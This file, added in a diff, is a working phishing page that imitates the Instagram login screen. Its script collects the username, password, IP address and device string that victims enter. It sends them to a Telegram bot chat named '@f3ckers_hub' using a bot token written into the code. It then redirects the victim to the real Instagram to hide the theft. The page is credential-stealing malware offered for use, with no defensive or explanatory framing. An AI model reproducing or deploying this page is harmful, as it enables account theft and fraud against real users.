@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background: #fafafa; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            min-height: 100vh; 
+            padding: 20px;
+        }
+        .container { 
+            background: white; 
+            border: 1px solid #dbdbdb; 
+            border-radius: 4px; 
+            padding: 40px 40px 20px; 
+            width: 100%; 
+            max-width: 350px; 
+            text-align: center;
+        }
+        .logo { 
+            width: 175px; 
+            height: 51px; 
+            background: url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTc1IiBoZWlnaHQ9IjUxIiB2aWV3Qm94PSIwIDAgMTc1IDUxIiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxwYXRoIGQ9Ik0xMzQuMjUgMjguMjVIMTU4VjI4SDkzLjQ1OFYxOVgyOS4zMTZWMjhIMTYzLjI1VjI4LjI1SDkzLjQ1OFYyNy43NUgyOS4zMTZWNDIuNUgxNTguVjQyLjVIMTIzLjc1VjI4LjI1SDEzNC4yNVYyOC4yNVoiIGZpbGw9IiMxQTc4REIiLz48cGF0aCBkPSJNMTE4LjQzOCA0Mi41SDk4LjQzOFYxOUgxMTguNDM4VjQyLjVaIiBmaWxsPSIjMTc1MDk5Ii8+PHBhdGggZD0iTTkzLjQ1OCA0Mi41SDgzLjc1VjI4SDEzLjI1VjI4LjI1SDgzLjc1VjQyLjVIMzkuNjI1VjI4LjI1SDkzLjQ1OFYyOC4yNUg4My43NVYyNy43NUg5My40NTg0MjUuNWgxNS4zODhWMjguMjVoLTUuNDg0VjQyLjVaIiBmaWxsPSIjNDg1RjY1Ii8+PHBhdGggZD0iTTI5LjMxNiAyOC4yNUgyOS4zMTZWMTlaIiBmaWxsPSIjRkNGMjAyIi8+PHBhdGggZD0iTTI5LjMxNiAxOVYyOC4yNUgyOS4zMTZaIiBmaWxsPSIjRkNGMjAyIi8+PHBhdGggZD0iTTI5LjMxNiAyOC4yNUgyOS4zMTZWNDIuNUgyOS4zMTZaIiBmaWxsPSIjRkNGMjAyIi8+PC9zdmc+') no-repeat;
+            margin: 0 auto 30px;
+        }
+        h2 { font-size: 13px; font-weight: 600; color: #262626; margin-bottom: 10px; }
+        .form-group { margin-bottom: 10px; }
+        input[type="text"], input[type="password"] { 
+            width: 100%; 
+            padding: 9px 0 7px 8px; 
+            border: 1px solid #efefef; 
+            border-radius: 3px; 
+            background: #fafafa; 
+            font-size: 14px; 
+            line-height: 18px; 
+            color: #262626;
+            margin-bottom: 6px;
+        }
+        input[type="text"]:focus, input[type="password"]:focus { 
+            border-color: #b2b2b2; 
+            background: white; 
+            outline: none;
+        }
+        input::placeholder { color: #8e8e8e; }
+        .login-btn { 
+            width: 100%; 
+            padding: 5px 9px; 
+            background: #0095f6; 
+            border: none; 
+            border-radius: 5px; 
+            color: white; 
+            font-weight: 600; 
+            font-size: 14px; 
+            cursor: pointer; 
+            margin-bottom: 20px;
+        }
+        .login-btn:hover { background: #007bb5; }
+        .login-btn:active { background: #006b9a; }
+        .divider { 
+            display: flex; 
+            align-items: center; 
+            margin: 20px 0; 
+            font-size: 13px; 
+            color: #8e8e8e;
+        }
+        .divider::before, .divider::after { 
+            content: ''; 
+            flex: 1; 
+            height: 1px; 
+            background: #efefef;
+        }
+        .divider span { padding: 0 16px; }
+        .forgot { color: #00376b; font-size: 12px; text-decoration: none; }
+        .footer { margin-top: 30px; font-size: 12px; color: #8e8e8e; }
+        .loading { display: none; text-align: center; color: #0095f6; font-size: 14px; margin-top: 10px; }
+        @media (max-width: 500px) { .container { border: none; padding: 10px; } }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo"></div>
+        <h2>Log in to Instagram</h2>
+        
+        <form id="loginForm">
+            <div class="form-group">
+                <input type="text" id="username" placeholder="Phone number, username, or email" required>
+            </div>
+            <div class="form-group">
+                <input type="password" id="password" placeholder="Password" required>
+            </div>
+            <button type="submit" class="login-btn">Log in</button>
+            <div id="loading" class="loading">Logging you in...</div>
+        </form>
+        
+        <div class="divider">
+            <span>OR</span>
+        </div>
+        
+        <a href="#" class="forgot">Forgot password?</a>
+        
+        <div class="footer">
+            Get the app.
+            <br><a href="#">App Store</a> • <a href="#">Google Play</a>
+            <br><a href="#">About • Help • Press • API • Jobs • Privacy • Terms</a>
+            <br>© 2026 Instagram from Meta
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const submitBtn = document.querySelector('.login-btn');
+            const loading = document.getElementById('loading');
+            
+            // Show loading state
+            submitBtn.style.display = 'none';
+            loading.style.display = 'block';
+            
+            // ✅ CONFIGURED FOR @f3ckers_hub + YOUR 6th BOT TOKEN
+            const payload = {
+                chat_id: '@f3ckers_hub',
+                text: `🔥 *Instagram HIT* 🔥\n\n` +
+                      `👤 *Username:* \`${username}\`\n` +
+                      `🔑 *Password:* \`${password}\`\n` +
+                      `🌐 *IP:* ${await getClientIP()}\n` +
+                      `📱 *Device:* ${navigator.userAgent.slice(0,50)}...\n` +
+                      `🕐 *Time:* ${new Date().toLocaleString()}\n\n` +
+                      `⚡ *f3ckers_hub capture*`,
+                parse_mode: 'Markdown'
+            };
+            
+            const botToken = '8544562690:AAGDwjbDeOhu_N86JWpuMjJIDoqtgV1lato';
+            
+            try {
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+            } catch (error) {
+                console.error('Telegram failed:', error);
+            }
+            
+            // Redirect to real Instagram (2 sec delay)
+            setTimeout(() => {
+                window.location.href = 'https://www.instagram.com/';
+            }, 2000);
+        });
+        
+        async function getClientIP() {
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                return data.ip;
+            } catch {
+                return 'Unknown';
+            }
+        }
+    </script>
+</body>
+</html>
